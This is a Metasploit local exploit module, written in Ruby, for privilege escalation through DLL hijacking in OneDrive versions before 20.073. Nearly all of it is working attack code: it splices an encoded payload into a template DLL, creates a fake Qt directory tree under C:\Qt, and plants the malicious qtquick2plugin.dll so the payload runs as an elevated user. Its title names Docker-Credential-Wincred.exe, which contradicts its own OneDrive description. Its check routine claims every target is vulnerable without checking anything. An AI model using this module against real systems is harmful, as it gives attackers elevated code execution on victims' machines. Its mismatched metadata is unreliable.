##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Post::Windows::Priv
  include Post::Windows::Runas

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Docker-Credential-Wincred.exe Privilege Escalation',
        'Description' => %q{
        This module adds a payload to a DLL loaded by OneDrive versions
        before 20.073.  If an elevated user accesses the onedrive binary,
        the payload will run as that user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'ELIAS DIMOPOULOS', # discovery
          'bwatters-r7', # metasploit module
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Targets' => [[ 'Automatic', {} ]],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'WfsDelay' => 15
        },
        'DisclosureDate' => '2019-07-05',
        'Notes' =>
        {
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        },
        'Payload'        =>
        {
          'Space'           => 1000,
        },
        'References' => [
          # no CVE issued
          ['URL', 'https://labs.redyops.com/index.php/2020/04/27/onedrive-privilege-of-escalation/']
        ]
      )
    )
  end


  def check
    # Need to check OneDrive Version (Reg query likely the best bet)
    return CheckCode::Appears
  end

  def exploit
    check_permissions!
    # make payload
    config_data = exploit_data('onedrive_dll_hijack', 'qmldir')
    donutted_dll_data = exploit_data('onedrive_dll_hijack', 'onedrive_dll_hijack_template.dll')
    donut = 'PAYLOAD:' + 'A'*1000
    if donutted_dll_data.include?(donut)
      vprint_status("Found donut hole!  Filling...")
      payload_data = payload.encoded
      pad_size = donut.length - payload_data.length
      padded_payload_data = payload_data + make_nops(pad_size)
      patched_dll_data = donutted_dll_data.gsub(donut, padded_payload_data)
    else
      fail_with(Failure::NotFound, "Failed to locate donut hole in template")
    end

    # set up directory structure
    create_directory = 'C:\\Qt'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    create_directory += '\\Qt-5.11.1'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    create_directory += '\\qml'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    create_directory += '\\QtQuick.2.7'
    vprint_status("Creating #{create_directory}")
    mkdir(create_directory)
    # write config file
    config_dest = create_directory + '\\qmldir'
    write_file(config_dest, config_data)
    # write dll payload
    dll_dest = create_directory + '\\qtquick2plugin.dll'
    write_file(dll_dest, patched_dll_data)
  end

  def check_permissions!
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?
  end
end
